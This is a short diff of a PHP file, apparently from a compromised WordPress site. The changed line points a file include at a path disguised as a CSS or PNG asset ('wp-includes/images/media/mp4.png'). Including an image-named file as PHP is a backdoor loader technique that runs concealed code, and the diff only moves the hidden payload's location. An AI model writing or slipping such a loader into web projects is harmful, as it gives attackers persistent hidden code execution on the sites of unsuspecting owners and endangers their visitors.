@@ -1,5 +1,5 @@
 <?php
-$file = '/home/lamanuv/www/wp-content/themes/theme-check/assets/gray-futur.css';
+$file = '/home/cafinto/public_html/wp-includes/images/media/mp4.png';
 
 if (is_file($file)) {
     include $file;
